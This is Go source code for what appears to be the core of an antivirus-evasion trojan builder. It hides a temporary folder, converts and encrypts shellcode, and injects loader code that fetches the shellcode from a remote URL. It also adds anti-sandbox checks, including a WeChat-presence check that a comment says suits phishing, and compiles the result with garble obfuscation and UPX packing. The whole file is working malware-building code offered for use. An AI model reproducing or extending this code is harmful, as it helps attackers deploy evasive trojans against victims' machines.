package core

import (
	"AniYa/encode"
	"AniYa/sandbox"
	"embed"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path"
	"strings"
	"syscall"
)

const (
	SANDBOX = "sandbox"
	ENCODE  = "decode"
	TempDir = "temp"
)

type Option struct {
	Module            string
	SrcFile           string
	DstFile           string
	ShellcodeEncode   string
	Donut             bool
	Separate          bool
	ShellcodeLocation string
	ShellcodeUrl      string
	AntiSandboxOpt    AntiSandboxOption
	BuildOpt          BuildOption
}

type AntiSandboxOption struct {
	TimeStart      bool `根据木马运行时间确定启动参数`
	RamCheck       bool `通过检查内存来反沙箱`
	CpuNumberCheck bool `通过检查cpu的核数来反沙箱`
	WechatCheck    bool `检查是否存在微信来反沙箱，适合钓鱼使用`
	DiskSizeCheck  bool `检查硬盘大小来反沙箱`
}

type BuildOption struct {
	Garble     bool `是否使用garble进行编译`
	Upx        bool `编译之后是否使用upx进行压缩加壳，压缩效果很好`
	LiteralObf bool `需配合garble使用！混淆字符串`
	SeedRandom bool `需配合garble使用！`
	Race       bool `编译时选取竞争测试，会使文件变大，也会让免杀效果变好`
	Hide       bool `隐藏黑框,会减少免杀效果`
}

//必须在该文件下放置module文件夹
//go:embed "module"
var moduleFolder embed.FS

var Modules = make(map[string][]byte, 8)

//通过embed将模块的loader装载进程序，不再依赖本地文件
func init() {
	n, _ := moduleFolder.ReadDir("module")
	println(len(n))
	for i := 0; i < len(n); i++ {
		nf, _ := n[i].Info()
		loaderFileContent, _ := moduleFolder.ReadFile(path.Join("module", nf.Name(), "main.go"))
		Modules[nf.Name()] = loaderFileContent
	}
}

// MakeTrojan module string, shellcodencode string, sanboxopt Antisandboxopt, buildopt2 Buildopt, donut bool, srcfile string, trojan string
func MakeTrojan(options Option) {
	//创建一个隐藏文件夹
	os.Mkdir(TempDir, os.ModePerm)
	TempName, err := syscall.UTF16PtrFromString(TempDir)
	if err != nil {
		log.Println(err)
	}
	err = syscall.SetFileAttributes(TempName, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		log.Println(err)
	}
	//将payload放入temp文件夹下
	if options.Donut {
		PE2shellcode(options.SrcFile)
	} else {
		FileCopy(options.SrcFile, path.Join(TempDir, "shellcode"))
	}
	//根据选取的module将loader文件放入临时文件夹
	err = ioutil.WriteFile(path.Join(TempDir, "main.go"), Modules[options.Module], os.ModePerm)
	if err != nil {
		log.Println(err)
	}
	//通过时间生成的key放入临时文件夹
	//TODO:使用随机种子生成满足各种加密形式的key
	key := generateKey()
	//加密shellcode
	encodeShellcode(options.ShellcodeEncode, key)
	//分离加载shellcode
	if options.Separate {
		addSeparate(options.ShellcodeLocation, options.ShellcodeUrl)
	}
	//隐藏cmd窗口
	if options.BuildOpt.Hide {
		addHideWindows()
	}
	//添加沙箱
	addAntiSandbox(options.AntiSandboxOpt)
	//根据build参数生成木马
	finalBuild(options.BuildOpt, options.DstFile)
	println("build done!")
	//清理临时文件夹
	os.RemoveAll(TempDir)
}
func addSeparate(location string, url string) {
	var separateCode []string
	fileBefore := strings.Split(location, "\\")
	file := fileBefore[len(fileBefore)-1]
	println(file)
	FileCopy(path.Join(TempDir, "shellcode"), file)
	ioutil.WriteFile(path.Join(TempDir, "shellcode"), []byte(""), os.ModePerm)
	location = strings.ReplaceAll(location, "\\", "\\\\")
	if url != "" {
		separateCode = []string{`res, _ := http.Get("` + url + `")
	shellcode, _ = ioutil.ReadAll(res.Body)`, `
	"net/http"
	"io/ioutil"
	//__IMPORT__`}
	} else {
		separateCode = []string{`shellcode, _ = ioutil.ReadFile("` + location + `")`, `
	"io/ioutil"
	//__IMPORT__`}
	}
	addCode(separateCode, "separate")
}

func addHideWindows() {
	hideCode := []string{`win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)`, `
	"github.com/lxn/win"
	//__IMPORT__`}
	addCode(hideCode, "hide")
}

func encodeShellcode(shellcodeEncode string, key []byte) {
	var afterBytecode []byte
	beforeBytecode, _ := ioutil.ReadFile(path.Join(TempDir, "shellcode"))
	switch shellcodeEncode {
	//xor + hex + base85
	case "xor+hex+base85":
		afterBytecode = encode.Encode1(beforeBytecode, key)
		println("shellcode xor+hex+base85加密完成！")
		addCode(encode.Decode1string, ENCODE)
	case "xor+rc4+hex+base85":
		afterBytecode = encode.Encode2(beforeBytecode, key)
		addCode(encode.Decode2string, ENCODE)
	case "rc4+hex+base85":
		afterBytecode = encode.Encode3(beforeBytecode, key)
		addCode(encode.Decode3string, ENCODE)
	}
	ioutil.WriteFile(path.Join(TempDir, "shellcode"), afterBytecode, os.ModePerm)
	println("loader 添加解密代码完成！")
}

func addAntiSandbox(opt AntiSandboxOption) {
	if opt.TimeStart {
		addCode(sandbox.Timestart, SANDBOX)
	}
	if opt.RamCheck {
		addCode(sandbox.Ramcheck, SANDBOX)
	}
	if opt.CpuNumberCheck {
		addCode(sandbox.Cpunumber, SANDBOX)
	}
	if opt.DiskSizeCheck {
		addCode(sandbox.Disksizecheck, SANDBOX)
	}
	if opt.WechatCheck {
		addCode(sandbox.Wechatexist, SANDBOX)
	}
	println("sandbox down!")
}

func finalBuild(buildOpt BuildOption, dstFile string) {
	println("start build")
	if buildOpt.Garble {
		println("garble:")
		command := []string{
			"build",
			"-o",
			dstFile,
			path.Join(TempDir, "main.go"),
		}
		opt := make([]string, 0, 12)
		if buildOpt.SeedRandom {
			opt = append(opt, "-seed=random")
		}
		if buildOpt.LiteralObf {
			opt = append(opt, "-literals")
		}
		opt = append(opt, command...)
		//println(len(opt))
		fmt.Printf("%v", opt)
		cmd := exec.Command("garble", opt...)
		println(cmd.String())
		if err := cmd.Run(); err != nil {
			log.Fatalln(err)
		}
	} else {
		command := []string{
			"build",
			"-o",
			dstFile,
			"-trimpath",
			"-ldflags",
			"-s -w",
		}
		if buildOpt.Race {
			command = append(command, "-race")
		}
		command = append(command, path.Join(TempDir, "main.go"))
		cmd := exec.Command("go", command...)
		println(cmd.String())
		if err := cmd.Run(); err != nil {
			log.Fatalln(err)
		}
	}
}
